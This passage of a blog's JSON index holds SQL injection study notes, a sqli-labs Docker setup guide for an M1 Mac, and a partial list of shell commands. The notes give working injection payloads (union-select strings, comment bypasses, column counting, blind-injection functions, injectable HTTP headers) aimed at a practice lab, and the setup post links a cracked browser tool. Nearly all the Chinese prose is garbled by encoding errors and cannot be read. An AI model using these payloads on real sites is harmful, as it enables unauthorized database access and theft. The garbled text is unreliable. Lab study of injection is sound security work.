çŸ¥é“ä¸¤æ¡å·²çŸ¥æ¡ä»¶æ—¶ 1select column_name from schema_name.table_name where column_name1 = â€˜some_valueâ€™ and column_name2 = â€˜some_valueâ€™; å¸¸ç”¨å‡½æ•° database() ï¼š è¿”å›å½“å‰æ•°æ®åº“å user() ï¼šè¿”å›MYSQLå½“å‰ç”¨æˆ·å version() ï¼šè¿”å›MYSQLçš„ç‰ˆæœ¬ concat() ï¼šè”åˆæ•°æ®ï¼Œç”¨äºè”åˆä¸¤æ¡æ•°æ®ç»“æœã€‚concat(userid,0x3a,username) group_concat() ï¼šå’Œconcat()ç±»ä¼¼ï¼Œç”¨äºå°†å¤šæ¡æ•°æ®ä¸€æ¬¡æ³¨å…¥å‡ºæ¥ hex()å’Œunhex() ï¼šç”¨äºhexç¼–ç å’Œè§£ç  load_file() ï¼šä»¥æ–‡æœ¬æ–¹å¼è¯»å–æ–‡ä»¶ æ³¨é‡Š è¡Œé—´æ³¨é‡Šï¼šâ€“ å’Œ # 12select * from user;-select * from user;# è¡Œå†…æ³¨é‡Šï¼š/*æ³¨é‡Šå†…å®¹*/å’Œ /*! MYSQLä¸“å±*/ å…¶ä¸­MYSQLä¸“å±çš„å†…è”æ³¨é‡Šå¯ä»¥ç”¨äºæ•´ä¸ªSQLè¯­å¥ä¸­ï¼Œå…¶ä¸­çš„SQLä»£ç ä¹Ÿä¼šè¢«æ‰§è¡Œã€‚ 1select table_schema,table_name,column_name from columns /*! union* / select 1,2,3; limit limitä¼šè¿”å›å‰é¢å‡ æ¡æˆ–è€…ä¸­é—´å‡ æ¡æ•°æ® 1select * from user limit m,n å…¶mæŒ‡è®°å½•ä»0å¼€å§‹çš„ç¬¬m+1æ¡è®°å½•ï¼Œ næŒ‡ä»ç¬¬m+1æ¡å¼€å§‹å–næ¡è®°å½• å¯¹sqlæ³¨å…¥çš„ä¸€äº›ç†è§£åŠ å•å¼•å·å’ŒåŠ  and 1&#x3D;2æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ æœ‰åŒºåˆ«ï¼Œå•å¼•å·æ˜¯ä¸ºäº†é—­åˆè¯­å¥ï¼Œè€Œand 1&#x3D;2æ˜¯ä¸ºäº†è®©unionå‰é¢çš„è¯­å¥æ— æŸ¥è¯¢ç»“æœæ— è¾“å‡ºï¼Œç„¶åç›´æ¥è¾“å‡ºæ‹¼æ¥è¿›å»unionåé¢çš„é‚£ä¸ªè¯­å¥çš„æŸ¥è¯¢ç»“æœï¼› and æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ and ä¸ºå’Œçš„æ„æ€ï¼Œä¸€ä¸ªè¯­å¥ä¸­ï¼Œå½“å‰ä¸€ä¸ªæ­£ç¡®ï¼Œåä¸€ä¸ªé”™è¯¯æ—¶ï¼Œå¦‚æœæ˜¯andè¿æ¥æ•´ä¸ªè¯­å¥è¿”å›çš„æ˜¯Falseï¼› oræ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ or ä¸ºå’Œçš„æ„æ€ï¼Œä¸€ä¸ªè¯­å¥ä¸­ï¼Œå½“å‰ä¸€ä¸ªæ­£ç¡®ï¼Œåä¸€ä¸ªé”™è¯¯æ—¶ï¼Œå¦‚æœæ˜¯orè¿æ¥æ•´ä¸ªè¯­å¥è¿”å›çš„æ˜¯True and å’Œ or é€‰æ‹©ä½¿ç”¨æœ‰ä»€ä¹ˆè®²ç©¶ï¼Ÿand è¯­å¥æ‰§è¡Œæ—¶ï¼Œå¦‚æœand å‰çš„è¯­å¥è¿”å›False,é‚£ä¹ˆandåé¢çš„è¯­å¥æ ¹æœ¬ä¸æ‰§è¡Œï¼› limitçš„ä½œç”¨limitåœ¨æ³¨å…¥ä¸­ç”¨äºæ’åºç„¶åè¾“å‡ºï¼Œlimit aï¼Œbä¸­ã€‚aä»£è¡¨ä»å“ªä¸ªä½ç½®ï¼ˆä»0å¼€å§‹ï¼‰ï¼Œbä»£è¡¨ä»é‚£ä½å¼€å§‹æ˜¾ç¤ºå‡ æ¡æ•°æ® sqlçš„æ³¨é‡Šæ³¨é‡Šåé¢çš„è¯­å¥ï¼Œé˜²æ­¢sqlæ³¨å…¥ç‚¹ååŸæœ¬çš„sqkè¯­å¥å¯¹sqkæ³¨å…¥è¿›è¡Œå¹²æ‰°ã€‚ %23 ç¼–ç ä¸º#ï¼Œmysqlæ•°æ®åº“ç‰¹æœ‰çš„ã€‚æŠŠåé¢çš„è¯­å¥å…¨éƒ¨æ³¨é‡Šæ‰ --+ æŠŠåé¢çš„è¯­å¥å…¨éƒ¨æ³¨é‡Šæ‰ /**/ å†…è”æ³¨é‡Šï¼Œæ³¨é‡ŠæŒ‡å®šéƒ¨åˆ†ã€‚éœ€è¦ä¸€å‰ä¸€åé—­åˆï¼Œæ‰€ä»¥åœ¨ä¼ å‚é‚£é‡Œå‡ ä¹ä¸åšæ³¨é‡Šè¯­å¥ç”¨ï¼Œè€Œæ˜¯ç”¨äºè¿‡æ»¤ç©ºæ ¼ç­‰bypass 1?id=-1&#x27;/**/union/**/select/**/1,2,database()--+ //è¿‡æ»¤ç©ºæ ¼,ç”¨/**/ä»£æ›¿ç©ºæ ¼ é—­åˆæ˜¯ä»€ä¹ˆï¼Ÿ åœ¨sqlæŸ¥è¯¢ä¸­ï¼Œä»£ç æ¯”è¾ƒä¸¥è°¨ï¼Œæ‹¬å·å’Œå¼•å·éƒ½å¾—æˆåŒæˆå¯¹ï¼Œå¼•å·å†…çš„é»˜è®¤æ˜¯å­—ç¬¦ä¸²ä¸ä¼šå½“ä½œSQLè¯­å¥æ‰§è¡Œï¼Œæ‰€ä»¥å¿…é¡»é—­åˆç„¶åæ‰èƒ½æ³¨å…¥ï¼Œå½“ç„¶æœ‰äº›SQLè¯­å¥ç›´æ¥æ‹¼æ¥ï¼Œä¹Ÿå°±ä¸ç”¨ä»€ä¹ˆé—­åˆäº†ï¼› mysqlæ•°æ®åº“å¸¸ç”¨å‡½æ•°ä¸å‚æ•° &gt;, &gt;&#x3D;, &lt;, &lt;&#x3D;, &#x3D; æ¯”è¾ƒè¿ç®—ç¬¦ and, or é€»è¾‘è¿ç®—ç¬¦ version() mysqlæ•°æ®åº“ç‰ˆæœ¬ database() å½“å‰æ•°æ®åº“å sleep() ç¡çœ æ—¶é—´ä¸ºæŒ‡å®šçš„ç§’æ•° if(true,t,f) ifåˆ¤æ–­ length() è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ substring() , substr() , mid() æˆªå–å­—ç¬¦ä¸².ä¸‰ä¸ªå‡½æ•°ä½œç”¨ç›¸åŒæœ‰ä¸‰ä¸ªå‚æ•° mid(â€œ1â€,2,3)1.æˆªå–çš„å­—ç¬¦ä¸²2.æˆªå–èµ·å§‹ä½ç½®ï¼Œä»1å¼€å§‹è®¡æ•°3.æˆªå–é•¿åº¦ left() ä»å·¦ä¾§å¼€å§‹å–æŒ‡å®šå­—ç¬¦ä¸ªæ•°çš„å­—ç¬¦ä¸² concat() æ²¡æœ‰åˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸² concat_ws() å«æœ‰åˆ†å‰²ç¬¦çš„è¿æ¥å­—ç¬¦ä¸² group_conat() è¿æ¥ä¸€ä¸ªç»„çš„å­—ç¬¦ä¸² ascii() , ord() è¿”å›ASCIIç  hex() å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶ unhex() hexçš„åå‘æ“ä½œ md5() è¿”å›MD5å€¼ floor() è¿”å›ä¸å¤§äºxçš„æœ€å¤§æ•´æ•° round() è¿”å›å‚æ•°xæ¥è¿‘çš„æ•´æ•° rand() è¿”å›0-1ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•° load_file() è¯»å–æ–‡ä»¶ï¼Œå¹¶è¿”å›æ–‡ä»¶å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸² find_in_set() è¿”å›å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²åˆ—è¡¨ä¸­çš„ä½ç½® benchmark() æŒ‡å®šè¯­å¥æ‰§è¡Œçš„æ¬¡æ•° name_const() è¿”å›è¡¨ä½œä¸ºç»“æœ user() ç”¨æˆ·å current_user() å½“å‰ç”¨æˆ·å system_user() ç³»ç»Ÿç”¨æˆ·å @@datadir æ•°æ®åº“è·¯å¾„ @@version_compile_os æ“ä½œç³»ç»Ÿç‰ˆæœ¬ åˆ¤æ–­æ³¨å…¥ç‚¹0. åˆ¤æ–­é—­åˆåœ¨å‚æ•°åé¢åŠ å•å¼•å·æŠ¥é”™ï¼Œå¹¶ä¸”å¦‚æœåŠ ä¸Šæ³¨é‡Šçš„è¯å¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼Œå°±æ˜¯å•å¼•å·é—­åˆçš„ã€‚ 12?id=1&#x27; //æŠ¥é”™?id=1&#x27;--+ //æ­£å¸¸æ˜¾ç¤º -- æ˜¯sqlçš„æ³¨é‡Šæ–¹å¼ +å·çš„å«ä¹‰ï¼Œä½¿ç”¨ â€“ ï¼ˆæœ‰ä¸ªç©ºæ ¼ï¼‰ï¼Œåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ç©ºæ ¼ä¼šè¢«å¿½ç•¥ï¼ŒåŒæ ·å¯¼è‡´æ— æ³•æ³¨é‡Šï¼Œæ‰€ä»¥åœ¨getè¯·æ±‚ä¼ å‚æ³¨å…¥æ—¶æ‰ä¼šä½¿ç”¨ â€“+ çš„æ–¹å¼æ¥é—­åˆï¼Œå› ä¸º + ä¼šè¢«è§£é‡Šæˆç©ºæ ¼ã€‚ 1. å­—ç¬¦å‹åŠ å•å¼•å·åœ¨å‚æ•°åé¢ç›´æ¥æ·»åŠ å•å¼•å·ï¼Œæ˜¾ç¤ºæ•°æ®åº“é”™è¯¯ä¿¡æ¯æˆ–è€…é¡µé¢å›æ˜¾ä¸åŒè¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹ã€‚ åŒæ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æäº¤çš„å‚æ•°ä¸¤è¾¹æ˜¯æœ‰å•å¼•å·åŒ…è£¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‡ºæ³¨å…¥ç‚¹çš„ç±»å‹æ˜¯å­—ç¬¦å‹ï¼Œå•å¼•å·é—­åˆã€‚ 1?id=1&#x27; å‡ºé”™ä½ç½®åœ¨ &#39;&#39;1&#39;&#39;LIMIT 0,1&#39; 2. æ•°å­—å‹å¦‚æœä¼ å…¥çš„å‚æ•°æ²¡æœ‰åœ¨æŠ¥é”™ä¿¡æ¯ä¸­æ˜¾ç¤ºï¼Œåˆ™æ˜¯æ•°å­—å‹ã€‚ å‡ºé”™ä½ç½®åœ¨&#39;&#39; LIMIT 0,1&#39; è¿˜å¯ä»¥é€šè¿‡åœ¨idåæ·»åŠ è¿ç®—ç¬¦ï¼Œæ¯”å¦‚-1ï¼Œ+2ï¼Œè¿™æ ·æ¥è§‚å¯Ÿé¡µé¢çš„å†…å®¹æ˜¯å¦ä¼šå˜æˆå¯¹åº”çš„id æ¥åˆ¤æ–­æ³¨å…¥çš„ç±»å‹ã€‚ æ³¨æ„è¿ç®—ç¬¦è¦è¿›è¡ŒURLç¼–ç  1?id=1%2B1 //1+1 å¯ä»¥å‘ç°ï¼Œid=1+1 å’Œ id=2 æ˜¾ç¤ºçš„é¡µé¢æ˜¯ä¸€æ ·çš„ åˆ¤æ–­æ˜¾ç¤ºä½çŸ¥é“äº†å½“å‰è¡¨çš„åˆ—æ•°æˆ‘ä»¬å°±å¼€å§‹åˆ¤æ–­ç¬¬å‡ åˆ—çš„å†…å®¹ä¼šæ˜¾ç¤ºåˆ°é¡µé¢ä¸­æ¥ã€‚ éœ€è¦æ˜¾ç¤ºä½çš„æ³¨å…¥æ–¹å¼ï¼š unionè”åˆæŸ¥è¯¢æ³¨å…¥ æ²¡æœ‰å›æ˜¾æ—¶å¯ä»¥ç”¨çš„æ³¨å…¥æ–¹å¼ï¼š æŠ¥é”™æ³¨å…¥ã€å¸ƒå°”æ³¨å…¥ã€æ—¶é—´ç›²æ³¨ æ„å»ºunion selectè¯­å¥æ—¶ï¼Œå½“å‰é¢çš„æŸ¥è¯¢è¯­å¥ä¸ºå‡ï¼Œä¹Ÿå°±æ˜¯æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œunion selectä¹‹åæŸ¥è¯¢å‡ºçš„ç»“æœå°±ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å‰é¢æŸ¥è¯¢è¯­å¥ä¸­æ·»åŠ  and 1&#x3D;2 ä½¿è¯­å¥å˜å‡ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å°†idä¼ å…¥ä¸€ä¸ªè´Ÿæ•°ï¼Œæ¥ä½¿è¯­å¥å˜å‡ã€‚ 123?id=-1&#x27; union select 1,2,3 --+ ?id=-1&#x27; union select 1,1,1 --+ //éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯ä¸ºäº†æ‰¾åˆ°å“ªä¸€ä½æ˜¯æ˜¾ç¤ºä½?id=1&#x27; and 1=2 union select 1,2,3 --+ ä¿®æ”¹æ˜¾ç¤ºä½çš„ä¸ªæ•°ï¼Œç›´åˆ°èƒ½æ­£å¸¸æ˜¾ç¤ºã€‚ è¯´æ˜æ˜¾ç¤ºä½æ˜¯ç¬¬2ä½å’Œ3ä½ã€‚ (åç»­å°±å¯ä»¥åˆ©ç”¨è¿™ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼ŒæŠŠæ•°å­—2ï¼Œ3æ¢æˆå…¶ä»–æŸ¥è¯¢è¯­å¥ï¼Œè·å–è‡ªå·±æƒ³è¦çš„å†…å®¹ï¼Œæ¯”å¦‚database(), version() ) é€»è¾‘è¿ç®—åˆ©ç”¨å¸ƒå°”ç›²æ³¨ã€‚æœ‰æ—¶éœ€è¦ä¸€äº›è¯­å¥çš„çœŸå‡é€»è¾‘ï¼Œè¿™æ—¶å¯ä»¥åˆ©ç”¨ and 1=1 è¡¨ç¤ºçœŸã€‚and 1=2 è¡¨ç¤ºå‡ã€‚ æ·»åŠ äº†é€»è¾‘è¿ç®—ç¬¦ä¹‹åæäº¤ï¼Œå› ä¸º1&#x3D;1æ’ä¸ºçœŸï¼Œè€Œ1&#x3D;2æ’ä¸ºå‡ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬çš„è¾“å…¥å¸¦å…¥äº†æ•°æ®åº“ï¼Œä¸€å®šä¼šå½±å“åˆ°SQLè¯­å¥çš„å¸ƒå°”çŠ¶æ€ï¼Œå¦‚æœä¸¤æ¬¡æŸ¥è¯¢è¿”å›çš„é¡µé¢ä¸åŒï¼Œè¯´æ˜é¡µé¢å­˜åœ¨å¸ƒå°”çŠ¶æ€ï¼Œæ­¤å¤„å­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨å¸ƒå°”ç›²æ³¨è¿›è¡Œæ³¨å…¥ã€‚ åˆ¤æ–­å­—æ®µæ•°è¾“å…¥1â€™ order by 1 --+ï¼Œæ˜¾ç¤ºæ­£å¸¸ è¾“å…¥1â€™ order by 2 --+æ˜¾ç¤ºæ­£å¸¸ è¾“å…¥1â€™ order by 3 --+ï¼ŒæŸ¥è¯¢å¤±è´¥ è¯´æ˜å­—æ®µæ•°åªæœ‰ä¸¤åˆ—ã€‚ å¯»æ‰¾æ³¨å…¥ç‚¹ getè¯·æ±‚æ³¨å…¥ æäº¤æ•°æ®çš„æ–¹å¼æ˜¯GETè¯·æ±‚ï¼Œæ³¨å…¥ç‚¹çš„å‚æ•°ä½äºGETå‚æ•°éƒ¨åˆ†ã€‚ 1http://www.demo/com/index.php?id=1 postè¯·æ±‚æ³¨å…¥ æäº¤æ•°æ®çš„æ–¹å¼æ˜¯POSTè¯·æ±‚ï¼Œæ³¨å…¥ç‚¹ä½äºPOSTæ•°æ®å†…ï¼Œé€šå¸¸å‘ç”Ÿåœ¨è¡¨å•é‡Œ cookieæ³¨å…¥ æ³¨å…¥ç‚¹çš„å‚æ•°ä½äºcookieä¸­ httpå¤´æ³¨å…¥ æ³¨å…¥ç‚¹ä½äºHTTTPè¯·æ±‚å¤´éƒ¨ä¸­çš„æŸä¸ªå­—æ®µï¼Œä¾‹å¦‚User-Agentå­—æ®µä¸­ã€‚ å¸¸è§httpæ³¨å…¥çš„å‚æ•°ï¼š 12345678910HTTP_CLIENT_IP&#x27;HTTP_X_FORWARDED_FOR&#x27;&#x27;HTTP_X_FORWARDED&#x27;â€˜HTTP_X_CLUSTER_CLIENT_IPâ€™â€˜HTTP_FORWARDED_FORâ€™â€˜HTTP_FORWARDEDâ€™â€˜REMOTE_ADDRUser-agentRefererX-Forwarded-For sqlæ³¨å…¥é˜²å¾¡ SQLè¯­å¥é¢„ç¼–è¯‘å’Œç»‘å®šå˜é‡ è®¾ç½®å¥½æ•°æ®åº“ç”¨æˆ·çš„æƒé™ ä½¿ç”¨ä¸¥æ ¼çš„è¿‡æ»¤ str_replace()æ›¿æ¢è¿‡æ»¤ addslashes()å‡½æ•°,æ·»åŠ è½¬ä¹‰å­—ç¬¦ è¿‡æ»¤å¸¸è§å±é™©å­—ç¬¦ä¸² htmlspecialchars()å‡½æ•°å®ä½“åŒ–è¿‡æ»¤ ä¸€äº›å…·ä½“çš„sqlæ³¨å…¥æ–¹å¼sqlè”åˆæŸ¥è¯¢æ³¨å…¥ - Gryffinbit æ–‡ç« å‚è€ƒSQLæ³¨å…¥å­¦ä¹  - zs0zrc MySQLæ•°æ®åº“æ³¨å…¥æ”»å‡»æ–¹å¼ | Ulyssesâ€™Blog SQLæ³¨å…¥æ³¨å…¥ç‚¹åˆ¤æ–­ä¸æ³¨å…¥æ‰‹æ³•ä»‹ç» - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Webå®‰å…¨/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"}],"author":"Gryffinbit"},{"title":"sqli-labå­¦ä¹ è®°å½•ã€macOS M1ã€‘","slug":"sqli-labå­¦ä¹ è®°å½•ã€macOS-M1ã€‘","date":"2022-02-05T13:36:12.000Z","updated":"2024-11-12T06:59:15.000Z","comments":true,"path":"2022/02/05/sqli-labå­¦ä¹ è®°å½•ã€macOS-M1ã€‘/","permalink":"https://gryffinbit.top/2022/02/05/sqli-lab%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90macOS-M1%E3%80%91/","excerpt":"","text":"sqli-labé¶åœºå­¦ä¹ è®°å½•è‡ªå·±å¼€å§‹æ¶‰è¶³webï¼Œäºæ˜¯ä»sqlæ³¨å…¥å¼€å§‹ï¼Œè®°å½•ä¸€ä¸‹sqli-labé¶åœºçš„å­¦ä¹ è¿‡ç¨‹ã€‚ä»¥åŠä½¿ç”¨Macosçš„æ–°èŠ¯ç‰‡M1ï¼Œé‡è§çš„å‘å’Œä¸€äº›å®‰è£…è¿‡ç¨‹ã€‚ å®éªŒç¯å¢ƒDockerInstall Docker Desktop on Mac | Docker Documentation Dockerçš„ä¸‹è½½åœ°å€ã€‚ M1èŠ¯ç‰‡çš„ï¼Œé€‰æ‹©Mac with apple chipç‰ˆæœ¬ä¸‹è½½ã€‚ ä¸‹è½½ä¹‹ååŒå‡»å®‰è£…å°±å¯ä»¥ã€‚ å®‰è£…æˆåŠŸåï¼Œåœ¨æ‰“å¼€ç»ˆç«¯ï¼ŒæŸ¥çœ‹å®‰è£…ç»“æœ 1docker --version æ›´æ¢é•œåƒæº ç”±äºå›½å¤–dockeræ­å»ºå¤ªæ…¢ï¼Œå›½å¤–çš„å®‰è£…æ–‡æ¡£ä¹Ÿå¾ˆå…¨é¢ï¼Œæ‰€ä»¥å»ºè®®æ›´æ¢ä¸ºå›½å†…çš„é•œåƒæºã€‚ åœ¨èœå•æ æ‰“å¼€åå¥½è®¾ç½®ï¼Œpreferenceã€‚æ‰¾åˆ°docker engineï¼Œä¿®æ”¹ä¸€ä¸‹é…ç½®ï¼ŒæŠŠä¸‹é¢çš„å†…å®¹åŠ è¿›å»ã€‚ 123&quot;registry-mirrors&quot;: [ &quot;https://docker.mirrors.ustc.edu.cn&quot; ], ä¸Šé¢çš„æ˜¯ä¸­ç§‘å¤§çš„æºï¼ˆæˆ‘ä¸ªäººè§‰å¾—æ˜¯æœ€å¥½ç”¨çš„ï¼‰ï¼Œä»¥ä¸‹æ˜¯å…¶ä»–çš„æºï¼Œåšå¤‡ç”¨é€‰æ‹© 12345http://hub-mirror.c.163.com //ç½‘æ˜“https://mirror.ccs.tencentyun.com //è…¾è®¯https://reg-mirror.qiniu.com //åä¸ºhttps://cr.console.aliyun.com/cn-hangzhou/instances/mirrors //é˜¿é‡Œäº‘éœ€è¦æ³¨å†Œååˆ†é…http://f1361db2.m.daocloud.io //DaoCloudé•œåƒ sqli-labsé¶åœºGitHub - Audi-1&#x2F;sqli-labs: SQLI labs to test error based, Blind boolean based, Time based.Sqli-labs æ˜¯ä¸€ä¸ªå¼€æºä¸”å…¨é¢çš„ SQL æ³¨å…¥ç»ƒä¹ é¶åœºï¼Œæ‰‹å·¥æ³¨å…¥å¿…å¤‡çš„ç»ƒä¹ ç¯å¢ƒ æœ¬æ¬¡é‡‡ç”¨dockerè¿›è¡Œç¯å¢ƒçš„æ­å»ºã€‚ ç›´æ¥åœ¨ dockerhub æœç´¢ï¼Œæ‰¾ä¸‹è½½é‡æ¯”è¾ƒé«˜ï¼ˆacgpiano&#x2F;sqli-labsï¼‰çš„æ¥å®‰è£…ã€‚ 1docker pull acgpiano/sqli-labs å®‰è£…æˆåŠŸåå¼€å¯ï¼Œå¹¶è®¿é—® 12docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest http://127.0.0.1:8888 //æµè§ˆå™¨è®¿é—® dockerçš„åŸºæœ¬ä½¿ç”¨ åœ¨dockerhubä¸Šä¸‹è½½é•œåƒ 1docker pull &lt;é•œåƒåå­—&gt; è¿è¡Œä¸€ä¸ªå®¹å™¨ -d åˆ†ç¦»æ¨¡å¼ã€‚ ä¸ºäº†ä½¿å®¹å™¨ç»§ç»­è¿è¡Œï¼Œå¿…é¡»å°†ç»ˆç«¯çª—å£ä¿æŒæ‰“å¼€çŠ¶æ€ã€‚å…³é—­ç»ˆç«¯çª—å£ä¼šåœæ­¢æ­£åœ¨è¿è¡Œçš„å®¹å™¨ã€‚è¿™æ˜¯å› ä¸ºï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå®¹å™¨åœ¨å‰å°è¿è¡Œï¼Œå¹¶åƒä»ç»ˆç«¯è°ƒç”¨çš„ä»»ä½•å…¶ä»–æ™®é€šç¨‹åºä¸€æ ·å°†å…¶è‡ªèº«é™„åŠ åˆ°ç»ˆç«¯ã€‚ä¸ºäº†è¦†ç›–æ­¤è¡Œä¸ºå¹¶ä¿æŒå®¹å™¨åœ¨åå°è¿è¡Œï¼Œå¯ä»¥åœ¨ run å‘½ä»¤ä¸­åŒ…å« -d é€‰é¡¹ -p 8888:80 è¿™æ„å‘³ç€å‘é€åˆ°ä¸»æœºç³»ç»Ÿç«¯å£8888 çš„ä»»ä½•è¯·æ±‚éƒ½å°†è½¬å‘åˆ°å®¹å™¨å†…çš„ç«¯å£ 80ã€‚ç°åœ¨è¦åœ¨æµè§ˆå™¨ä¸Šè®¿é—®è¯¥åº”ç”¨ç¨‹åºï¼Œåªéœ€è®¿é—® http://127.0.0.1:8888 â€“name ç»™å®¹å™¨å‘½å -t ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ 12docker run -dt --name &lt;è‡ªå·±å¯¹å®¹å™¨å‘½å&gt; -p &lt;ä¸»æœºç³»ç»Ÿç«¯å£&gt;:&lt;å®¹å™¨å†…ç«¯å£&gt; &lt;pullä¸‹æ¥çš„å®¹å™¨åå­—&gt; docker run -dt --name sqli-lab -p 8888:80 acgpiano/sqli-labs:latest //ä¾‹å¦‚ åœæ­¢ä¸€ä¸ªå®¹å™¨ å…¶ä¸­ container identifier å¯ä»¥æ˜¯å®¹å™¨çš„ ID æˆ–åç§°ã€‚ 1docker stop &lt;container identifier&gt; æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œä»¥åŠç›¸å…³ä¿¡æ¯ 12docker container ls --all docker ps -a é¶åœºçš„åˆå§‹åŒ–è®¾ç½®è¿™ä¸ªå®¹å™¨é»˜è®¤æ˜¯æ²¡åˆå§‹åŒ– SQLi-labs æ•°æ®åº“çš„ï¼Œæ‰€ä»¥å¾—è‡ªå·±åˆå§‹åŒ–ä¸€ä¸‹ã€‚ é€šè¿‡æŸ¥çœ‹å®¹å™¨é‡Œé¢çš„é…ç½®æ–‡ä»¶ï¼Œå‘ç° MySQL çš„ root ç”¨æˆ·çš„å¯†ç ä¸º ç©ºï¼Œç›¸å…³ç‰ˆæœ¬çš„ç»†èŠ‚å¦‚ä¸‹ï¼šï¼ˆä»å›¾å½¢ç•Œé¢ä¸­æ‰¾åˆ°å‘½ä»¤è¡Œï¼Œå¹¶è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼‰ 1234mysql -e &quot;select version(),user()&quot;php --versioncd /etc/init.d/ &amp;&amp; apache2 -vuname -a HackBarçš„ä½¿ç”¨GitHub - fengwenhua&#x2F;hackbar_crack: hackbar ä¹‹ Firefox å­¦ä¹ ç‰ˆã€ä¸€ä¸ªGitHubçš„ç ´è§£é¡¹ç›®ã€‘ sqlæ³¨å…¥çš„ç›¸å…³çŸ¥è¯† å¯ä»¥å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡Blog","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Webå®‰å…¨/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"},{"name":"MacOS","slug":"MacOS","permalink":"https://gryffinbit.top/tags/MacOS/"},{"name":"M1èŠ¯ç‰‡","slug":"M1èŠ¯ç‰‡","permalink":"https://gryffinbit.top/tags/M1%E8%8A%AF%E7%89%87/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://gryffinbit.top/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"Gryffinbit"},{"title":"linux/macos ä¸Šä¸€äº›å¸¸ç”¨çš„å‘½ä»¤","slug":"linux-macos-ä¸Šä¸€äº›å¸¸ç”¨çš„å‘½ä»¤","date":"2022-02-05T13:13:06.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/02/05/linux-macos-ä¸Šä¸€äº›å¸¸ç”¨çš„å‘½ä»¤/","permalink":"https://gryffinbit.top/2022/02/05/linux-macos-%E4%B8%8A%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/","excerpt":"","text":"Linux&#x2F;Macosä¸Šå¸¸ç”¨å‘½ä»¤æ”¶å½•sqlã€æ¸—é€ç›¸å…³ç¯‡base64ç¼–ç  1echo -n &lt;å­—ç¬¦ä¸²&gt; | base64 è¯¢é—®å½“å‰è·¯å¾„ 1pwd dockerçš„åŸºæœ¬ä½¿ç”¨ åœ¨dockerhubä¸Šä¸‹è½½é•œåƒ 1docker pull &lt;é•œåƒåå­—&gt; è¿è¡Œä¸€ä¸ªå®¹å™¨ -d åˆ†ç¦»æ¨¡å¼ã€‚ ä¸ºäº†ä½¿å®¹å™¨ç»§ç»­è¿è¡Œï¼Œå¿…é¡»å°†ç»ˆç«¯çª—å£ä¿æŒæ‰“å¼€çŠ¶æ€ã€‚å…³é—­ç»ˆç«¯çª—å£ä¼šåœæ­¢æ­£åœ¨è¿è¡Œçš„å®¹å™¨ã€‚è¿™æ˜¯å› ä¸ºï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå®¹å™¨åœ¨å‰å°è¿è¡Œï¼Œå¹¶åƒä»ç»ˆç«¯è°ƒç”¨çš„ä»»ä½•å…¶ä»–æ™®é€šç¨‹åºä¸€æ ·å°†å…¶è‡ªèº«é™„åŠ åˆ°ç»ˆç«¯ã€‚ä¸ºäº†è¦†ç›–æ­¤è¡Œä¸ºå¹¶ä¿æŒå®¹å™¨åœ¨åå°è¿è¡Œï¼Œå¯ä»¥åœ¨ run å‘½ä»¤ä¸­åŒ…å« -d é€‰é¡¹ -p 8888:80 è¿™æ„å‘³ç€å‘é€åˆ°ä¸»æœºç³»ç»Ÿç«¯å£8888 çš„ä»»ä½•è¯·æ±‚éƒ½å°†è½¬å‘åˆ°å®¹å™¨å†…çš„ç«¯å£ 80ã€‚ç°åœ¨è¦åœ¨æµè§ˆå™¨ä¸Šè®¿é—®è¯¥åº”ç”¨ç¨‹åºï¼Œåªéœ€è®¿é—® http://127.0.0.1:8888 â€“name ç»™å®¹å™¨å‘½å -t 